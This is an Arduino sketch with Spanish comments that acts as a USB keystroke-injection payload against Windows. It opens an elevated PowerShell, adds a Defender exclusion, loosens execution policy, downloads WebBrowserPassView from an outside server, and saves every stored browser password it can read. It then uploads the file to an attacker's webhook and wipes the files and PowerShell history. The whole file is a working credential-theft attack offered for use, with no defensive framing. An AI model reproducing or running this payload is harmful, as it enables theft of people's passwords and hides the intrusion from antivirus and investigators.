#include <HID.h>
#include <Keyboard.h>

char quotation;
char contrabarra;

// Función de utilidad para escribir una tecla
void typeKey(int key) {
  Keyboard.press(key);
  delay(500);  // Espera para asegurar que la tecla se registre
  Keyboard.release(key);
}

void setup() {
  quotation = 34;    // Caracter de comillas dobles
  contrabarra = 92;  // Caracter de barra inversa

  // Iniciar teclado
  Keyboard.begin();

  // Abrir cuadro de diálogo Ejecutar
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(2000);

  // Ejecutar PowerShell con privilegios de administrador
  Keyboard.print("powershell -Noprofile \"Start-Process powershell -verb runas\"");
  typeKey(KEY_RETURN);
  delay(3000);

  // Confirmar ejecución como administrador
  Keyboard.press(KEY_LEFT_ARROW);
  delay(1000);
  typeKey(KEY_RETURN);
  delay(3000);

  // Configurar la variable de webhook
  Keyboard.print("$webhook = <webhook>"); //poner aqui el webhook
  typeKey(KEY_RETURN);
  delay(1000);

  // Configurar la variable de nombre de usuario
  Keyboard.print("$username = $env:USERNAME");
  delay(1000);
  typeKey(KEY_RETURN);

  // Crear directorio temporal y cambiar políticas de ejecución
  Keyboard.print("cd C:\\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath \"C:\\temp\" ; Set-ExecutionPolicy unrestricted");
  typeKey(KEY_RETURN);
  delay(3000);

  // Confirmar cambio de política de ejecución
  Keyboard.print("O");
  typeKey(KEY_RETURN);

  // Limpiar pantalla
  Keyboard.print("clear");
  typeKey(KEY_RETURN);
  delay(3000);

  // Descargar y extraer herramientas necesarias
  Keyboard.print("Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\\7z\\7za.exe e webpassview.zip;");
  typeKey(KEY_RETURN);
  delay(3000);
  Keyboard.print("A");
  typeKey(KEY_RETURN);
  delay(2000);

  // Ejecutar herramienta WebBrowserPassView
  Keyboard.print(".\\WebBrowserPassView.exe");
  typeKey(KEY_RETURN);
  delay(1000);

  // Seleccionar todo y guardar
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1500);

  // Guardar archivo
  Keyboard.print("temp.html");
  typeKey(KEY_RETURN);
  delay(1000);

  // Navegar y confirmar guardado
  Keyboard.press(KEY_LEFT_ALT);
  delay(300);
  Keyboard.press('f');
  delay(300);
  typeKey(KEY_DOWN_ARROW);
  typeKey(KEY_DOWN_ARROW);
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  // Mover archivo a la carpeta temporal
  Keyboard.print("mv C:\\Users\\$username\\Documents\\temp.html .");
  delay(800);
  typeKey(KEY_RETURN);

  // Verificar existencia del archivo antes de enviarlo
  delay(300);
  Keyboard.print("$filePath = \"C:\\temp\\temp.html\"; if (Test-Path $filePath) { Write-Host 'File exists'; curl.exe -F \"file1=@$filePath\" $webhook } else { Write-Host 'File not found' }");
  typeKey(KEY_RETURN);
  delay(1000);

  // Limpiar entorno
  Keyboard.print("cd .. ; rm -r temp/");
  typeKey(KEY_RETURN);
  delay(1000);

  // Restaurar configuraciones de seguridad
  Keyboard.print("Remove-MpPreference -ExclusionPath \"C:\\temp\" ; Set-ExecutionPolicy restricted");
  typeKey(KEY_RETURN);
  delay(1500);

  // Confirmar cambio de política de ejecución
  Keyboard.print("O");
  typeKey(KEY_RETURN);
  delay(1000);

  // Eliminar historial de PowerShell
  Keyboard.print("Remove-Item (Get-PSreadlineOption).HistorySavePath");
  typeKey(KEY_RETURN);
  delay(500);

  // Salir de PowerShell
  Keyboard.print("exit");
  //typeKey(KEY_RETURN);

  // Finalizar teclado
  Keyboard.end();
}

void loop() {
  // No se utiliza en este script
}
